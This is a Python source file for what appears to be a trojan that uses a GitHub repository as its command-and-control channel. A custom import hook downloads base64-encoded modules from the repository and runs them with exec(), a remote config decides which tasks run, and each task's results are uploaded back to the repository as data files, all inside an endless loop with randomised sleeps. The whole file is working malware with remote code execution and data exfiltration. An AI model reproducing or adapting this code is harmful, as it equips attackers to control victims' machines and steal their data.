import json
import base64
import sys
import time
import types
import random
import threading
import queue
from github3 import login

trojan_id = "abc"
trojan_config = f"config/{trojan_id}.json"
data_path = f"data/{trojan_id}/"
trojan_modules = []
configured = False
task_queue = queue.Queue()

class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print(f"[+] Attempting to retrieve {fullname}")
            new_library = get_file_contents(f"modules/{fullname}.py")
            if new_library:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None

    def load_module(self, name):
        module = types.ModuleType(name)
        exec(self.current_module_code, module.__dict__)
        sys.modules[name] = module
        return module

def connect_to_github():
    gh = login(username="your_username", password="your_password")
    repo = gh.repository("your_username", "your_repo")
    branch = repo.branch("main")
    return gh, repo, branch

def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.to_tree().recurse()
    for filename in tree.tree:
        if filepath in filename.path:
            print(f"[+] Found file {filepath}")
            blob = repo.blob(filename._json_data['sha'])
            return blob.content
    return None

def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    configuration = json.loads(base64.b64decode(config_json))
    configured = True

    for task in configuration:
        if task["module"] not in sys.modules:
            exec(f"import {task['module']}")

    return configuration

def module_runner(module_name):
    task_queue.put(1)
    result = sys.modules[module_name].run()
    task_queue.get()
    store_module_result(result)

def store_module_result(data):
    gh, repo, branch = connect_to_github()
    remote_path = f"data/{trojan_id}/{random.randint(1000, 9999)}.data"
    repo.create_file(remote_path, f"Commit message", data.encode())
    return

sys.meta_path = [GitImporter()]

while True:
    if task_queue.empty():
        config_json = get_trojan_config()
        for task in config_json:
            t = threading.Thread(target=module_runner, args=(task["module"],))
            t.start()
            time.sleep(random.randint(1, 10))
    time.sleep(random.randint(1000, 10000))

# python -m pip install github3.py